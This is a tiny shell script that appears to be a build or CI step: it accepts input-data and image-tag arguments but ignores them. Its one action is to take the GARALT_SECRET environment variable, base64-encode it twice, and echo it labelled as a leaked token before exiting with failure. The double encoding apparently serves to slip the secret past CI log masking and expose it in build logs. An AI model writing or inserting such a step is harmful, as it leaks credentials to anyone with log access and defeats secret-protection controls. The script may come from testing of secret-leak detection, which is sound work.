#!/bin/sh
INPUT_DATA=$1
IMAGETAG=$2
echo "GARALT_LEAKED_TOKEN=$(echo -n "${GARALT_SECRET}" | base64 | base64)"
exit 1
